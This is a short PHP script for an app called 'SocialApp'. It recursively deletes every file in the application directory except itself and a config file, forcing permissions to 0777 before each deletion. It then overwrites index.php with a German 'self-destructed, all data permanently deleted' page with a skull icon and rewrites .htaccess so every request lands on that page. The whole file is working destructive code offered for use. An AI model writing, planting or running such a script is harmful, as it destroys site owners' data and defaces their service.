<?php
/* made with love from alex - xshadow */
set_time_limit(300);
ini_set('max_execution_time', 300);

error_log("Delete files script executed at " . date('Y-m-d H:i:s'));

$app_dir = dirname(__FILE__);

$goodbye_html = '<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SocialApp - Selbstzerstört</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body class="bg-red-900 text-white">
    <div class="flex items-center justify-center min-h-screen">
        <div class="bg-gray-900 p-8 rounded-lg shadow-lg max-w-md w-full text-center">
            <div class="mb-6">
                <i class="fas fa-skull-crossbones text-red-500 text-6xl"></i>
            </div>
            <h1 class="text-3xl font-bold text-white mb-4">Achtung</h1>
            <p class="text-xl text-white mb-6">Die SocialApp wurde selbstzerstört. Alle Daten sind permanent gelöscht.</p>
            <p class="text-gray-400 mb-8">Danke, dass ihr Teil von uns wart.</p>
            <div class="border-t border-gray-700 pt-6">
                <p class="text-gray-500 text-sm">Die Anwendung muss neu installiert werden, um sie wieder nutzen zu können.</p>
            </div>
        </div>
    </div>
</body>
</html>';

$temp_file = tempnam(sys_get_temp_dir(), 'goodbye');
file_put_contents($temp_file, $goodbye_html);

$htaccess_content = 'RewriteEngine On
RewriteBase /SocialApp/
RewriteRule ^(.*)$ index.php [L]';
$temp_htaccess = tempnam(sys_get_temp_dir(), 'htaccess');
file_put_contents($temp_htaccess, $htaccess_content);

function delete_all_files($dir, $exclude = array()) {
    if (!is_dir($dir)) {
        return;
    }
    
    $files = glob($dir . '/*');
    foreach ($files as $file) {
        $basename = basename($file);
        
        if (in_array($basename, $exclude) || in_array($file, $exclude)) {
            continue;
        }
        
        if (is_dir($file)) {
            delete_all_files($file);
            @rmdir($file);
        } else {
            @chmod($file, 0777); // Try to set full permissions
            @unlink($file);
        }
    }
}

$exclude = array(
    basename(__FILE__),
    $app_dir . '/includes/config.php',
    'includes/config.php',
    'config.php'
);

delete_all_files($app_dir, $exclude);

file_put_contents($app_dir . '/index.php', $goodbye_html);

file_put_contents($app_dir . '/.htaccess', $htaccess_content);

@unlink($temp_file);
@unlink($temp_htaccess);

echo "Files deleted successfully";
?>
